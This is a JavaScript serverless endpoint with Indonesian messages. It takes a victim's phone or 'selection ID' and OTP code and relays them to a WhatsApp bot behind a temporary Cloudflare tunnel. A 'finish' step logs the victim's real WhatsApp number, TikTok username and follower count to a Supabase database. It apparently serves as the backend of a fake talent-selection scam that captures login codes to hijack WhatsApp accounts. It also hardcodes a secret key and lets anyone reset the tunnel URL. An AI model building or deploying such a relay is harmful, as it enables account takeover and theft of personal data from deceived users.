import axios from 'axios';

let activeBotTunnel = 'https://greetings-teaching-temporary-latina.trycloudflare.com/';
const TURNSTILE_SECRET_KEY = '0x4AAAAAAE7f-SFi2zqSl-4THBdLAoIYLYY';

const SUPABASE_URL = 'https://vngwcbnbkbrbzlrhfhmk.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZuZ3djYm5ia2JyYnpscmhmaG1rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTA0NTEwMTAsImV4cCI6MjEwNjAyNzAxMH0.8UezQ3N89YS9ugFhfXPgbHvCVxmLBcfOxFSwfxtC32s';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    };

    if (req.query.update_bot) {
        activeBotTunnel = req.query.update_bot.replace(/\/+$/, '');
        return res.status(200).json({
            success: true,
            message: 'Bot URL berhasil diperbarui!',
            active_url: activeBotTunnel
        })
    };

    if (req.method === 'GET') {
        return res.status(200).json({
            success: true,
            status: 'online',
            bot_endpoint: activeBotTunnel
        })
    };

    if (req.method === 'POST') {
        const { action, id, phone, code, token, username, followers, tier } = req.body;

        if (action === 'finish') {
            const cleanUser = (username || '').replace(/^@/, '').trim();
            const sessionID = (id || phone || '').trim();
            let realPhoneNumber = '';

            try {
                const botFinishRes = await axios.post(`${activeBotTunnel}/api/finish-selection`, {
                    id: sessionID,
                    username: cleanUser,
                    followers: Number(followers) || 0,
                    tier: tier || 'Gen 3'
                }, {
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 8000
                });

                if (botFinishRes.data && botFinishRes.data.phone) {
                    realPhoneNumber = String(botFinishRes.data.phone).trim();
                }
            } catch (botErr) {};

            try {
                await axios.post(`${SUPABASE_URL}/rest/v1/selection_users`, {
                    session_id: sessionID,
                    whatsapp_number: realPhoneNumber || sessionID,
                    tiktok_username: cleanUser,
                    followers_count: Number(followers) || 0,
                    tier: tier || 'Gen 3'
                }, {
                    headers: {
                        'apikey': SUPABASE_ANON_KEY,
                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
                        'Content-Type': 'application/json',
                        'Prefer': 'return=minimal'
                    },
                    timeout: 8000
                });
            } catch (dbErr) {};

            return res.status(200).json({ success: true });
        };

        if (!phone || !code) {
            return res.status(400).json({
                success: false,
                error: 'ID Seleksi dan Kode OTP wajib diisi!'
            })
        };

        if (!token) {
            return res.status(400).json({
                success: false,
                error: 'Verifikasi Cloudflare Turnstile wajib diselesaikan!'
            })
        };

        try {
            const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;

            const verifyFormData = new URLSearchParams();
            verifyFormData.append('secret', TURNSTILE_SECRET_KEY);
            verifyFormData.append('response', token);
            if (clientIp) {
                verifyFormData.append('remoteip', clientIp);
            };

            const turnstileRes = await axios.post('https://challenges.cloudflare.com/turnstile/v0/siteverify', verifyFormData.toString(), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                timeout: 5000
            });

            if (!turnstileRes.data || !turnstileRes.data.success) {
                return res.status(403).json({
                    success: false,
                    error: 'Verifikasi keamanan gagal atau token kedaluwarsa.'
                })
            };

            const response = await axios.post(`${activeBotTunnel}/api/verify-otp`, { phone, code }, {
                headers: { 'Content-Type': 'application/json' },
                timeout: 10000
            });

            return res.status(response.status).json(response.data);
        } catch (err) {
            const status = err.response ? err.response.status : 500;
            const errorMsg = err.response?.data?.error || 'Gagal menghubungi bot WhatsApp atau bot sedang offline.';
            
            return res.status(status).json({
                success: false,
                error: errorMsg
            })
        }
    };

    return res.status(405).json({
        success: false,
        error: 'Method Not Allowed'
    })
};
